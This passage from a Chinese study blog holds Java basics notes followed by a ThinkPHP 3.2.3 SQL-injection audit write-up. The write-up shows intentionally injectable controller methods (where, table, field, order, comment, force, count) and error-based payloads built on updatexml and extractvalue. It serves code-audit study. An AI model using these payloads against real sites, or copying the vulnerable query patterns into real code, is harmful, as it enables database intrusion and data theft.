info3=&quot;这是一段话&quot;;System.out.println(info3.startsWith(&quot;这&quot;));//输出true//把字符串按照某个指定内容分割成多个字符串，放到一个字符串数组中返回给我们String s5=&quot;张三,李四,王五,老六&quot;;String[] names=s5.split(&quot;,&quot;);\n 注意事项\n\n\nString对象的内容不可改变，被称为不可变字符串对象\n\n\n只要是以&quot;…&quot;方式写出的字符串对象，会存储到字符串常量池，且相同内容的字符串只存储一份\n\n但通过new方式创建字符串对象，每new一次都会产生一个新的对象放在堆内存中\n\n\n\n\nString s2=new String(&quot;abc&quot;);String s1=&quot;abc&quot;;Q1：前两行一行代码创建了几个对象？\nA1：第一行创建了两个。双引号中的abc会储存在常量池中，即常量池产生一个对象；new的时候又要产生一个字符串对象（放在堆中）。\n第二行创建了零个。常量池中已经有了abc，则s1直接指向abc。\nString s1=&quot;abc&quot;;String s2=&quot;ab&quot;;Srting s3=s2+&quot;c&quot;;System.out.println(s1==s3);Q2:输出结果？\nA2：false。s1指向常量区，而s3是运算，会放在堆中。\nString s1=&quot;abc&quot;;String s2=&quot;a&quot;+&quot;b&quot;+&quot;c&quot;;System.out.println(s1==s2);Q3:输出结果？\nA3：true。Java存在编译优化机制，程序在编译时&quot;a&quot;+“b”+&quot;c&quot;会直接转成&quot;abc&quot;以提高程序执行性能。\n ArrayList\n集合是一种容器，用来装数据，类似于数组，大小可变\n集合都支持泛型:“ArrayList&lt;E&gt;”，约束集合在编译阶段只能操作某种数据类型（包括对象）\n集合和泛型都不支持基本数据类型，只能支持引用数据类型\n\n\n\n\n static\n\n 修饰成员变量\n成员变量按照有无static修饰，分为两种：\n\n类变量：有static修饰，属于类，在计算机里只有一份，会被类的全部对象共享\n实例变量（对象变量）：无static修饰，属于每个对象\n\npublic class Student&#123;    static String name;//类变量    int age;//实例变量（对象的变量）&#125;\n类名.类变量（推荐）对象.类变量（不推荐）---对象.实例变量\n 修饰成员方法\n\n类方法：有static修饰的成员方法，属于类\n实例方法：无static修饰的成员方法，属于对象\n\n\n为什么工具类中方法要用类方法而不用实例方法？\n\n实例方法需要创建对象来调用，此时对象只是为了调用方法，对象占内存，会浪费内存\n类方法直接用类名调用即可，调用方便，也能节省内存\n\n\n\n工具类无创建对象的需求，建议将工具类的构造器进行私有\npublic class Mytools&#123;    private Mytools()&#123;&#125;    public static String toolone()&#123;        ...    &#125;&#125;\n\n 注意事项\npublic class Mytools&#123;    static String schoolName;//类变量    double score;//实例变量    1.类方法中可以直接访问类成员，不可直接访问实例成员    public static void printHorld()&#123;        //同一个类中，访问类成员，可以省略类名不写        schoolName=&quot;张三&quot;;        Student.printHelloWorld2();//可以        printHelloWorld2();//可以        System.out.println(score);//报错        printPass();//报错        System.out.println(this);//报错    &#125;    public static void printHelloWorld2()&#123;&#125;//类方法        2.实例方法中既可以直接访问类成员，也可以直接访问实例成员    3.实例方法中可以出现this关键字，类方法中不可出现this关键字    public void printPass()&#123;//实例方法        schoolName=&quot;李四&quot;;        printHelloWorld2();//可        System.out.println(score);//可        (this.)printPass2();//可        System.out.println(this);//可    &#125;    public void printPass2()&#123;&#125;\n 代码块\n\n类的五大成分（成员变量、构造器、方法、代码块、内部类）\n\n\n静态代码块\n\n格式：static{}\n特点：类加载时自动执行，由于类只会加载一次，所以静态代码块也只执行一次\n作用：完成类的初始化，例如：对类变量的初始化赋值\n\n实例代码块\n\n格式：{}\n特点：每次创建对象时，执行实例代码块，并在构造器前执行。\n作用：和构造器一样，都是用来完成对象的初始化的，例如：对实例变量进行初始化赋值\npublic class Student&#123;    static int number=80;    static String schoolName=&quot;张三&quot;;    static&#123;        System.out.println(&quot;静态代码块执行了&quot;);    &#125;//静态代码块    &#123;        System.out.println(&quot;实例代码块执行了&quot;);    &#125;//实例代码块&#125;public class Test&#123;    public static void main(String[] args)&#123;        System.out.println(Student.number);        /**         静态代码块执行了        80        */        Student s1=new Student();        /**        实例代码块执行了        无参数构造器执行了        */        Student s1=new Student(&quot;李四&quot;);        /**        实例代码块执行了        有参数构造器执行了        */    &#125;    public Student&#123;        System.out.println(&quot;无参构造器执行了&quot;);    &#125;    public Student(String name)&#123;        System.out.println(&quot;有参构造器执行了&quot;);    &#125;&#125;\n应用：比如创建对象的日志（不放到构造器而是代码块中执行，减少重复代码编写）\nSystem.out.println(&quot;有人创建了对象：&quot;+this);\n 单例设计模式\n设计模式：具体问题的最优解法\n\n解决什么问题？\n怎么写？\n\n\n确保一个类只有一个对象\n饿汉式单例对象\n写法\n\n把类的构造器私有\n定义一个类变量记住类的一个对象\n定义一个类方法，返回对象\n\npublic class A&#123;    private static A a=mew A();//2    private A()&#123;//1            &#125;    public static A getObject()&#123;//3        return a;    &#125;&#125;\n懒汉式单例对象\n写法\n\n把类的构造器私有\n定义一个类变量用于存储对象\n提供一个类方法，保证返回的是同一个对象\n\npublic class B&#123;    private static B b;//2    private B()&#123;//1            &#125;    public static B getInstance()&#123;//3        if(b==null)&#123;            b=new B();        &#125;        return b;    &#125;&#125;\n如果单例对象频繁用到——饿汉式\n很少去用它——懒汉式（节省内存）\n 继承\n关键字——extends\npublic class B extend A&#123;&#125;A：父类(基类或超类)B：子类(派生类)\n特点：子类可继承父类的非私有成员（成员变量、成员方法）\n继承后对象的创建：子类的对象是由子类、父类共同完成的\n 权限修饰符\n限制类中的成员（成员变量、成员方法、构造器、代码块…）能够访问的范围\n\n\n\n修饰符\n在本类中\n同一个包下的其他类\n任意包下的子类\n任意包下的任意类\n\n\n\n\nprivate\n√\n\n\n\n\n\n缺省\n√\n√\n\n\n\n\nprotected\n√\n√\n√\n\n\n\npublic\n√\n√\n√\n√\n\n\n\nprivate&lt;缺省&lt;protected&lt;public\n 单继承、Object\nJava中的类不支持多继承，但是支持多层继承\nObject类是Java所有类的祖宗类\n 方法重写\n声明不变，重新实现\n\n子类觉得父类中某个方法不好用，或无法满足自己的需求时，子类可以重写一个方法名称、参数列表一样的方法，去覆盖父类的这个方法\n重写后，Java遵循就近原则进行方法的访问\n参数列表相同叫重写，不同叫重载\n注意：\n\n\n重写小技巧：使用Override注解，它可以指定Java编译器，检查我们方法重写的格式是否正确，代码可读性会更好\n@Override \n\n\n子类重写父类方法时，访问权限必须大于或者等于父类该方法的权限==（public&gt;protected&gt;缺省）==\n\n\n重写的方法返回值类型必须与被重写方法的返回值类型一样，或者范围更小\n\n\n私有方法、静态方法不能被重写\n\n\n常见应用场景\n\n子类重写Object类的toString()方法，以便返回对象的内容\n\npublic String toString()&#123;    return &quot;Student&#123;name=&quot;+name+&quot;,age=&quot;+age+&quot;&#125;&quot;;&#125;//Object类中返回的是地址，重写后可按需返回相应内容\n直接Generate亦可生成\n 子类中访问其他成员的特点\n依照就近原则\n局部变量与成员变量冲突时，可在前加this\npublic class F&#123;    String name=&quot;父类名称&quot;;    public void print1()&#123;        System.out.println(&quot;父类的print1方法执行&quot;);    &#125;&#125;\npublic class Z extends F&#123;    String name=&quot;子类名称&quot;;    public void showName()&#123;        String name=&quot;局部名称&quot;;        System.out.println(name);//局部名称        System.out.println(this.name);//子类的成员变量        System.out.println(super.name);//父类的成员变量    &#125;        @Override    public void print1()&#123;        System.out.println(&quot;子类的print1执行&quot;);    &#125;        public void showMethod()&#123;        print1();//子类的        super.print1();//父类的    &#125;&#125;\n 子类构造器的特点\n子类的全部构造器，都会先调用父类的构造器，再执行自己\n\n在子类的全部构造器的第一行，都会有super();\n写不写都默认存在，它是调用父类的无参构造器的\n\n若父类只有有参构造器，则我们必须在子类构造器第一行手写super(…)，指定去调用父类的有参构造器↓\nclass F&#123;    public F(String name,int age)&#123;&#125;&#125;\nclass Z extends F&#123;    public Z()&#123;        super(&quot;张三&quot;,18);        System.out.println(&quot;子类的无参构造器执行&quot;);    &#125;    有参构造器同理&#125;\n this(…)调用兄弟构造器\n任意类的构造器中，都可以通过this(…)去调用该类的其他构造器\npublic class Test3&#123;    public static void main(String[] args)&#123;        Student s1=new Student(&quot;李四&quot;,26,&quot;家里蹲大学&quot;);        //若学生没有填写学校，那么学校默认是NUC        Student s2=new Student(&quot;李四&quot;,28);    &#125;&#125;class Student&#123;    private String name;    private int age;    private String schoolName;        public Student(String name,int age)&#123;        this(name,age,&quot;NUC&quot;);    &#125;    public Student(String name,int age)&#123;        this.name=name;        this.age=age;        this.schoolName=schoolName;    &#125;    后面的getset方法省略&#125;\n 多态\n在继承/实现情况下的一种现象，表现为：对象多态、行为多态\n前提：有继承/实现关系；存在父类引用子类对象；存在方法重写\n多态是对象、行为的多态，Java中的属性（成员变量）不谈多态\n好处\n\n在多态形式下，右边对象时解耦合的，更便于拓展和维护\n\n\n解耦合：比如系统中的每一个模块拆分成一个个的服务\n\n\n定义方法时使用父类类型的形参，可以接收一切子类对象，拓展性更强、更便利\n\n问题\n\n多态下不能使用子类的独有功能\n\n 多态下的类型转换问题\n\n\n自动类型转换：父类 变量名=new 子类();\nPeople p =new Teacher();\n\n\n强制类型转换：子类 变量名=(子类)父类变量\nTeacher t=(Teacher)p;\n\n\n注意事项\n\n\n存在继承/实现关系就可以在编译阶段进行强制类型转换，编译阶段不会报错\n\n\n运行时如果发现对象的真实类型与强转后的类型不同。就会报类型转换异常（ClassCastException）的错误\nPeople p=new Teacher();Student s=(Student) p;//ClassCastException\n\n\n强转前，Java建议：使用instanceof关键字，判断当前对象的真实类型，再进行强转\nif(p instanceof Student)&#123;    Student s2=(Student)p;&#125;\n final\n意思是最终，可以修饰（类、方法、变量）\n\n\n修饰类：该类被称为最终类，特点是不能被继承了\n\n\n修饰方法：该方法被称为最终方法，特点是不能被重写了\n\n\n修饰变量：该变量只能被赋值一次\n\n\nfinal class A&#123;&#125;//类public final void test()&#123;&#125;//方法\nfinal修饰变量的注意\n\n\nfinal修饰基本类型的变量，变量存储的数据不能被改变\n\n\nfinal修饰引用类型的变量，变量存储的地址不能被改变，但地址所指向对象的内容是可以被改变的\nfinal int[] arr=&#123;1,2,3&#125;arr=null;//错，变量地址不能动arr[1]=222;//可\n\n\n 常量\n使用了static final修饰的成员变量\n作用：通用用于记录系统的配置信息\n名称全部大写，多个单词下划线连接\npublic static final String SCHOOL_NAME=&quot;NUC&quot;;\n好处\n\n代码可读性更好，可维护性也更好\n程序编译后，常量会被“宏替换”：出现常量的地方全部会被替换成其记住的字面量，可保证使用常量和直接用字面量的性能是一样的\n\n 抽象类\n关键字：abstract，可用它修饰类、成员方法\n抽象方法只有方法签名，不能有方法体\n注意事项&amp;特点\n\n抽象类中不一定有抽象方法，有抽象方法的类一定是抽象类\n类该有的成员（成员变量、方法、构造器）抽象类都可以有\n==最主要的特点：==抽象类不能创建对象，仅作为一种特殊的父类，让子类继承并实现\n一个类继承抽象类，必须重写完抽象类的全部抽象方法，否则这个类也必须定义成抽象类\n\n好处\n父类知道每个子类都要做某个行为，但每个子类要做的情况不一样，父类就定义成抽象方法，交给子类去重写实现，更好的支持多态\n 常见应用场景：模板方法设计模式\n解决方法中存在重复代码的问题\n写法\n\n\n定义一个抽象类\n\n\n在里面定义两个方法\n\n一个是模板方法：把相同代码放里面\n一个是抽象方法：具体实现交给子类完成\n\n\n\n建议用final关键字修饰模板方法\n\n模板方法是给对象直接使用的，不能被子类重写\n一旦子类重写了模板方法，模板方法就失效了\n\n 接口\n关键字：interface\npublic interface 接口名&#123;    成员变量(Java默认是常量)(记得大写)    成员方法(Java默认是抽象方法)&#125;\n接口中不能有构造器、代码块，不能创建对象\n接口是用来被类实现（implements）的，实现接口的类成为实现类\n修饰符 class 实现类 implements 接口1,接口2...&#123;&#125;\n一个类可以实现多个接口（接口可以理解为干爹），实现类实现多个接口，必须重写完全部接口的全部抽象方法，否则实现类需要定义成抽象类\n好处\n\n弥补类单继承的不足，一个类同时可以实现多个接口\n让程序可以面向接口编程，可以灵活方便切换各种业务实现\n\n jdk8开始新增的方法\n\n\n默认方法：必须使用default修饰，默认会被public修饰\n（也就是实例方法：对象的方法，必须使用实现类的对象来访问\npublic interface A&#123;\tdefault void test1()&#123;    \tSystem.out.println(&quot;==默认方法==&quot;);\t&#125;&#125;---psvm)    B b=newB();\tb.test1();\n\n\n私有方法：必须使用private修饰（JDK9开始\n因为是私有方法，所以只能在接口内访问（比如在默认方法中访问、或者接口中的其他私有方法）\npublic interface A&#123;    private void test1()&#123;        System.out.println(&quot;==私有方法==&quot;);    &#125;&#125;\n\n\n静态方法：必须使用static修饰\npublic interface A&#123;\tstatic void test3()&#123;    \tSystem.out.println(&quot;==静态方法==&quot;);\t&#125;&#125;A.test3();\n\n\n 杂项\n IDEA管理Java程序的结构\n\nproject（项目、工程）\nmodule（模块）\npackage（包）\nclass（类）\n\n\n\n创建工程（空工程）\n创建模块\n创建包 src-新建包（域名倒写+名字）\n创建类 包-新建类（类名首字母大写）\n\n 快捷键\n\n\nmain/psvm、sout\n\n\nCtrl+D：复制当前行数据到下一行\n\n\nCtrl+Y：快速删除所在行\n\n\nCtrl+Alt+L：格式化代码\n\n\nAlt+shift+↑/↓：上下移动当前代码\n\n\nCtrl+/，Ctrl+shift+/：代码注释\n\n\n\n/**  */：文档注释\n\n\nAlt+Enter\n\n选中代码，然后Ctrl+Alt+T，快速以…包裹\n\n\n数组名.fori然后回车快速遍历数组\n右键-Generate-\n\n&quot;Getter and Setter&quot;快速生成get、set方法（shift再点击变量可多选）\n&quot;Constructor&quot;自动生成构造器\n\n\n\n String、StringBuffer与StringBuilder三者之间的区别？\nString、StringBuffer和StringBuilder是Java中用于处理字符串的类，它们之间有一些重要的区别。\n\n不可变性：\n\nString类是不可变的，一旦创建，它的值就不能被修改。每次对String进行操作（如拼接、替换等），都会创建一个新的String对象。这意味着在频繁操作字符串时，会引发大量的对象创建和销毁，影响性能。\nStringBuffer和StringBuilder是可变的，它们允许修改已有的字符串而不创建新的对象。在字符串频繁修改的场景中，它们的性能更好。\n\n\n线程安全性：\n\nString是线程安全的，因为它的不可变性保证了多线程环境下的安全性。\nStringBuffer是线程安全的，它的方法都使用了synchronized关键字进行同步。这使得它可以被多个线程安全地使用，但在高并发环境下性能相对较低。\nStringBuilder是非线程安全的，它的方法没有进行同步操作。在单线程环境下，StringBuilder的性能比StringBuffer更好。\n\n\n性能：\n\n由于String的不可变性，每次对String进行操作都会产生新的String对象，导致额外的内存开销。在频繁操作字符串的情况下，性能较差。\nStringBuffer和StringBuilder都是可变的，它们在进行字符串操作时不会创建新的对象，因此在频繁操作字符串时性能更好。\nStringBuilder相对于StringBuffer的性能更好，因为它不需要进行同步操作。\n\n\n\n综上所述，如果你需要一个可变的字符串，并且在单线程环境下进行操作，建议使用StringBuilder，因为它的性能最好。如果在多线程环境下进行操作，或者需要线程安全性，可以使用StringBuffer。只有在操作字符串不频繁的情况下，才建议使用String。\n 成员变量和局部变量的区别？\nField：成员变量\n\n\n\n区别\n成员变量\n局部变量\n\n\n\n\n类中位置\n类中，方法外\n常见于方法中\n\n\n初始化值\n有默认值，无需初始化赋值\n无默认值，使用前必须赋值\n\n\n内存位置\n堆内存\n栈内存\n\n\n作用域\n整个对象\n所属的大括号中\n\n\n生命周期\n与对象共存亡\n随方法的调用而生，随方法的运行结束而亡\n\n\n\n\n动态数组中的对象值是初始化的\n\n 搞懂main方法\npublic class Test&#123;    public static void main(String[] args)&#123;        ...    &#125;&#125;\nmain方法是类方法\n运行时Test.main(…)\n","tags":["技术栈"]},{"title":"ThinkPHP框架分析","url":"/2024/05/17/ThinkPHP%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/","content":" ThinkPHP框架分析\n MVC和三层结构的认识\nMVC是一种开发模式，三层结构是一种开发习惯，严格来讲是完全不同的概念，但是实际中有各种联系：\nMVC是一种将视图、控制、数据三者分开的一种开发模式：\n\n\n\n简写\n全称\n工作\n\n\n\n\nM\nModel（模型）\n编写Model类，负责数据的操作\n\n\nV\nView（视图）\n编写HTML文件，负责前台页面显示\n\n\nC\nController（控制器）\n编写类文件，IndexController.class.php\n\n\n\nThinkPHP3.2.3-Doc\n下文均以ThinkPHP3.2.3举例\n 核心文件\n\n项目目录\n\n├─ThinkPHP                     框架系统目录│  ├─Common                    核心公共函数目录│**├─Conf                      核心配置目录 │  ├─Lang                      核心语言包目录│**├─Library                   框架类库目录│  │  ├─Think                  核心Think类库包目录│  │  │  ├─Db                  │  │  │  │**├─Driver.class.php 数据条件分析，各种操作数据库│  │  │**├─Model.class.php     连贯操作│  │  ├─Behavior               行为类库目录│  │  ├─Org                    Org类库包目录│  │  ├─Vendor                 第三方类库目录│  │  ├─ ...                   更多类库目录│  ├─Mode                      框架应用模式目录│  ├─Tpl                       系统模板目录│  ├─LICENSE.txt               框架授权协议文件│  ├─logo.png                  框架LOGO文件│  ├─README.txt                框架README文件│  └─ThinkPHP.php              框架入口文件----------------------------------├─Application│  ├─Common            应用公共模块│  │ ├─Common          应用公共函数目录│  │ └─Conf            应用公共配置文件目录│  ├─Home              默认生成的Home模块│  │ ├─Conf            模块配置文件目录│  │ ├─Common          模块函数公共目录│**│ ├─Controller      模块控制器目录│**│ ├─Model           模块模型目录│  │ └─View            模块视图文件目录│**├─Runtime           运行时目录(可删除，运行时可再次生成)│  │ ├─Cache           模块缓存目录│  │ ├─Data            数据目录│  │ ├─Logs            日志目录│  │ └─Temp            缓存目录\n\n开启调试\n\nconfig.php添加语句\n&#x27;SHOW_PAGE_TRACE&#x27; =&gt;true,\n\n(config.php在Application/Common/Conf目录)\n\n 访问\nURL模式\n系统会从URL参数中解析当前请求的模块、控制器和操作：\n\n1（PATHINFO模式）\n\nhttp://serverName/index.php/模块/控制器/操作http://serverName/index.php/index/content/list\n\n0（普通模式）\n\nhttp://serverName/index.php?m=模块&amp;c=控制器&amp;a=方法名&amp;键1=值&amp;...http://serverName/index.php?m=index&amp;c=content&amp;a=list\n 控制器\nThinkPHP的控制器是一个类，而操作则是控制器类的一个公共（public function）方法。\n&lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller &#123;    public function index()&#123;        echo &#x27;hello,thinkphp!&#x27;;    &#125;&#125;\n 控制器操作\nA([模块/]控制器标志)实例化控制器对象\nR([模块/]控制器标志/操作方法)实例化控制器对象同时调用指定对象\n\nA方法\n\n跨控制器实例化后，再调用被实例化对象的方法\n$Test=A(&#x27;User&#x27;);$Test-&gt;index();\n\nR方法\n\n相比A方法更加简单快捷，直接调用控制器里的方法\nR(&#x27;Test/index&#x27;);\n\nAction参数绑定\n\nAction参数绑定是通过直接绑定URL地址中的变量作为操作方法的参数，Action参数绑定功能默认是开启的，其原理是把URL中的参数（不包括模块、控制器和操作名）和操作方法中的参数进行绑定\n&#x27;URL_PARAMS_BIND&#x27; =&gt; true\n\n官方推荐I方法\nI(&#x27;变量类型.变量名/修饰符&#x27;,[&#x27;默认值&#x27;],[&#x27;过滤方法或正则&#x27;],[&#x27;额外数据源&#x27;])//强转成int类型$id=I(&#x27;id&#x27;,&#x27;1&#x27;,&#x27;intval&#x27;);dump($id);\n\n\n请求类型\n\n\n\n\n常量\n说明\n\n\n\n\nIS_GET(POST、PUT、DELETE)\n判断是否是GET（POST、PUT、DELETE）方式提交\n\n\nIS_AJAX\n判断是否是AJAX提交\n\n\nREQUEST_METHOD\n当前提交类型\n\n\n\n\nAjax请求的时候，抓包后需在头部添加\nX-Requested-With:XMLHttpRequest\n\n\n插件控制器\n\n3.2.3版本开始，插件控制器默认和模块同级\nhttp://127.0.0.1/tp/home/info/index/addon/SystemInfo\n3.2.3版本中，实际访问呢的插件控制器是\nAddon/SystemInfo/Controller/InfoController.class.php\n插件控制器的定义如下：\n&lt;?phpnamespace Addon\\SystemInfo\\Controller;class InfoController extends \\Think\\Controller&#123;    public function index()&#123;        //http://127.0.0.1/tp/index.php/模块名字/控制器名字/控制器方法/和模块同级的插件控制器名字/目录        //http://127.0.0.1/tp/index.php/Home/info/index/addon/SystemInfo        phpinfo();    &#125;&#125;\n SQL注入\n 常规注入\n where方法\ndoc\n以字符串方式将条件作为where()方法的参数时会产生SQL注入\n//M(&#x27;user&#x27;)：实例化User对象M(&#x27;user&#x27;)-&gt;where(&#x27;id=&#x27;.I(&#x27;id&#x27;))-&gt;find();\n提交payload\n&quot; and 1=(updatexml(1,concat(0x3a,(user())),1))%23&quot;\n如果是数组查询进入_parseType方法分析，数组的val值会被转成int\n\n进入./ThinkPHP/Library/Think/Model.class.php中调试\n\n\n数组条件\n\npublic function getUserarray()&#123;    $User = M(&quot;User&quot;); // 实例化User对象    $map[&#x27;id&#x27;] = I(&#x27;id&#x27;);// 把查询条件传入查询方法    $User-&gt;where($map)-&gt;select();&#125;\n//Model.class.php中protected function _parseType(&amp;$data,$key) &#123;    if(!isset($this-&gt;options[&#x27;bind&#x27;][&#x27;:&#x27;.$key]) &amp;&amp; isset($this-&gt;fields[&#x27;_type&#x27;][$key]))&#123;        $fieldType = strtolower($this-&gt;fields[&#x27;_type&#x27;][$key]);        if(false !== strpos($fieldType,&#x27;enum&#x27;))&#123;            // 支持ENUM类型优先检测        &#125;elseif(false === strpos($fieldType,&#x27;bigint&#x27;) &amp;&amp; false !== strpos($fieldType,&#x27;int&#x27;)) &#123;            $data[$key]   =  intval($data[$key]);        &#125;elseif(false !== strpos($fieldType,&#x27;float&#x27;) || false !== strpos($fieldType,&#x27;double&#x27;))&#123;            $data[$key]   =  floatval($data[$key]);        &#125;elseif(false !== strpos($fieldType,&#x27;bool&#x27;))&#123;            $data[$key]   =  (bool)$data[$key];        &#125;    &#125;&#125;\n强转成intval，1p被强转成1，无注入\n table方法\n一般情况下，操作模型的时候系统能够自动识别当前对应的数据表，用到table方法的场景就是切换数据表查询\nM()-&gt;table(I(&#x27;tab&#x27;))-&gt;where(&#x27;1=1&#x27;)-&gt;find();\n究其原因是query方法\n field方法\nfield方法操作表中字段，限制查询返回的结果\nM(&#x27;user&#x27;)-&gt;field(array(&#x27;id&#x27;,&#x27;username&#x27;))-&gt;select();\n只要field方法里的参数可控，不管是数组还是字符串，都是可以被注入的\nM(&#x27;user&#x27;)-&gt;field(array(&#x27;id&#x27;,&#x27;username&#x27;=&gt;I(&#x27;name&#x27;)))-&gt;select();\n alias、join、union方法\nalias方法操作表的别名，和field方法用法类似\n一般和join方法成对出现，用于对数据的连贯操作\n出现join和union方法的时候，只要能控制参数一般情况下都会产生注入\n\n\n小结：\n所有在表名之前的操作符或方法大多数都可以被注入\n\n order、group、having\n\norder方法\n\nM(&#x27;user&#x27;)    -&gt;where(&#x27;1=1&#x27;)    -&gt;order(array(&#x27;id&#x27;=&gt;I(&#x27;orderby&#x27;)))    -&gt;select();\n\ngroup方法\n\n$data=M(&#x27;user&#x27;)    -&gt;find(&#x27;max(score),username&#x27;)    -&gt;group(&#x27;score&#x27;)    -&gt;select();dump($data);\n\nhaving方法\n\n$data=M(&#x27;user&#x27;)    -&gt;field(&#x27;max(score,username&#x27;)    -&gt;group(&#x27;score&#x27;)    -&gt;having(&#x27;score&gt;1&#x27;)    -&gt;select();dump($data);\n comment、index方法\n\ncomment\n\ncomment方法用于在生成的SQL语句中添加注释内容\n$data=M(&#x27;user&#x27;)    -&gt;comment(I(&#x27;com&#x27;))    -&gt;where(&#x27;1=1&#x27;)    -&gt;find();dump($data);//payload: */ procedure analyse(extractvalue(ramd(),concat(0x3a,user())),1);%23\n\nindex\n\nindex方法用于数据集的强制索引操作，对查询强制使用userid索引，userid必须是数据表实际创建的索引名称\n//&quot;.\\ThinkPHP\\Library\\Think\\Db\\Driver.class.php&quot;中内部方法名写为force，外部方法还是index，可在常量中看到//TP5.0版本中存在该漏洞（代码审计时重点关注一下）$data=M(&#x27;user&#x27;)-&gt;force(I(&#x27;f&#x27;))-&gt;select();dump($data);//payload: ?f=&#x27;userid&#x27;) procedure analyse(extractvalue(ramd(),concat(0x3a,user())),1);%23\n query、execute、聚合方法\nThinkPHP仍然保留了原生的SQL查询和执行操作支持，为了满足复杂查询的需要和一些特殊的数据操作\n\nquery方法\n\n实例化一个空模型后使用query方法查询数据\n$data=M()-&gt;query(&#x27;select * from thinkphp_user&#x27;);dump($data);\n\nexecute方法\n\nexecute方法可以新增、修改、删除数据，同样也是需要实例化空模型\nM()-&gt;execute(&quot;update thinkphp_user set username=&#x27;user&#x27; where id =1&quot;);\n\n聚合方法\n\ncount、max、min、avg、sum这5个方法注入场景类似\n$data=M(&#x27;user&#x27;)-&gt;count(I(&#x27;parameter&#x27;));dump($data);\n EXP注入\nEXP表达式查询，支持SQL语法\nexp查询的条件不会被当成字符串，所以后面的查询条件可以使用任何SQL支持的语法，包括使用函数和字段名称。查询表达式不仅可用于查询条件，也可以用于数据更新\n对于统计字段（通常指的是数字类型）的更新，系统还提供了setInc和setDec方法\n$user=M(&#x27;user&#x27;);$user-&gt;where(&#x27;id=5&#x27;)-&gt;setInc(&#x27;score&#x27;,3);//用户的积分加3$user-&gt;where(&#x27;id=5&#x27;)-&gt;setInc(&#x27;score&#x27;);//用户的积分加1$user-&gt;where(&#x27;id=5&#x27;)-&gt;setDec(&#x27;score&#x27;,5);//用户的积分减5$user-&gt;where(&#x27;id=5&#x27;)-&gt;setDec(&#x27;score&#x27;);//用户的积分减1\n Action参数注入\n审计的时候先查找I方法或者$_GET、$_POST等原生态的请求，从而容易忽略掉Action参数传入的变量\n\nThinkPHP5新增了INPUT函数\n\n如果带入到where方法里，表示以字符串的形式查询，也就造成了注入\npublic\\s+function\\s+[\\w_-]+\\(\\$\n 组合注入\n组合查询的主体还是采用数组方式查询，只是加入了一些特殊的查询支持，包括字符串模式查询（_string）、请求字符串查询（）\n _string注入\n数组条件可以和字符串条件（采用_string作为查询条件）混合使用\n _query注入\n请求字符串查询是一种类似于URL传参的方式，可以支持简单的条件相等判断\n$map[&#x27;id&#x27;] = array(&#x27;gt&#x27;,&#x27;100&#x27;);$map[&#x27;_query&#x27;] = &#x27;status=1&amp;score=100&amp;_logic=or&#x27;;\n\n 代码\n此处附&quot;.\\Application\\Home\\Controller\\IndexController.class.php&quot;和.\\Application\\Home\\Controller\\UserController.class.php源码\n//IndexController.class.php---&lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller &#123;    public function index()&#123;        //http://127.0.0.1/tp/index.php/home/index/index        echo &#x27;index!!!&#x27;;    &#125;    public function hello()&#123;        //http://127.0.0.1/tp/index.php/home/index/hello        echo &#x27;hello!!!&#x27;;    &#125;    public function getDbUser()&#123;        $data=M(&#x27;user&#x27;)-&gt;where(&#x27;id=1&#x27;)-&gt;select();        dump($data);    &#125;    public function getUserIndexA()&#123;        //http://127.0.0.1/tp/index.php/home/index/getUserIndexA        $Test=A(&#x27;User&#x27;);        $Test-&gt;index();    &#125;    public function getUserHelloA()&#123;        $hello=A(&#x27;User&#x27;);        $hello-&gt;hello();    &#125;    public function getUserIndexR()&#123;        R(&#x27;User/index&#x27;);    &#125;    public function getUserHelloR()&#123;        R(&#x27;User/hello&#x27;);    &#125;    public function getUser($id)&#123;        //http://127.0.0.1/tp/index.php/home/index/getUser/id/1        echo $id;    &#125;    public function getUserI()&#123;        //http://127.0.0.1/tp/index.php/home/index/getUserI/id/        $id=I(&#x27;id&#x27;,&#x27;1&#x27;,&#x27;intval&#x27;);        dump($id);    &#125;    public function getUserWhere()&#123;        //where方法        $data=M(&#x27;user&#x27;)-&gt;where(&#x27;id=&#x27;.I(&#x27;id&#x27;))-&gt;find();        dump($data);    &#125;    public function getUserArray()&#123;        //用数组查询        $User = M(&quot;User&quot;); // 实例化User对象        $map[&#x27;id&#x27;] = I(&#x27;id&#x27;);// 把查询条件传入查询方法        $User-&gt;where($map)-&gt;select();    &#125;    public function getUserTable()&#123;        //table方法        //创建一个空模型        M()-&gt;table(I(&#x27;tab&#x27;))-&gt;where(&#x27;1=1&#x27;)-&gt;find();    &#125;    public function getUserField()&#123;        //field方法        //&#x27;username&#x27;=&gt;I(&#x27;name&#x27;)给username一个别名        echo &quot;1&quot;;        M(&#x27;user&#x27;)-&gt;field(array(&#x27;id&#x27;,&#x27;username&#x27;=&gt;I(&#x27;name&#x27;)))-&gt;select();    &#125;    public function getUserOrder()&#123;        //order方法        M(&#x27;user&#x27;)-&gt;where(&#x27;1=1&#x27;)-&gt;order(array(&#x27;id&#x27;=&gt;I(&#x27;orderby&#x27;)))-&gt;select();    &#125;    public function getUserGroup()&#123;        //group方法        $data=M(&#x27;user&#x27;)-&gt;find(&#x27;max(score),username&#x27;)-&gt;group(&#x27;score&#x27;)-&gt;select();        dump($data);    &#125;    public function getUserHaving()&#123;        //having方法        $data=M(&#x27;user&#x27;)            -&gt;field(&#x27;max(score,username&#x27;)            -&gt;group(&#x27;score&#x27;)            -&gt;having(&#x27;score&gt;1&#x27;)            -&gt;select();        dump($data);    &#125;    public function getUserLimit()&#123;        //limit方法        $data=M(&#x27;user&#x27;)-&gt;limit(I(&#x27;limit&#x27;))-&gt;select();        dump($data);    &#125;    public function getUserComment()&#123;        //comment方法        $data=M(&#x27;user&#x27;)-&gt;comment(I(&#x27;com&#x27;))-&gt;where(&#x27;1=1&#x27;)-&gt;find();        dump($data);        //payload: */ procedure analyse(extractvalue(ramd(),concat(0x3a,user())),1);%23    &#125;    public function getUserIndex()&#123;        //&quot;.\\ThinkPHP\\Library\\Think\\Db\\Driver.class.php&quot;中内部方法名写为force，外部方法还是index，可在常量中看到        //TP5.0版本中存在该漏洞（代码审计时重点关注一下）        $data=M(&#x27;user&#x27;)-&gt;force(I(&#x27;f&#x27;))-&gt;select();        dump($data);        //payload: ?f=&#x27;userid&#x27;) procedure analyse(extractvalue(ramd(),concat(0x3a,user())),1);%23    &#125;    public function getUserCount()&#123;        //count方法        $data=M(&#x27;user&#x27;)-&gt;count(I(&#x27;parameter&#x27;));        dump($data);        //payload: ?parameter=id) as tp_count FROM 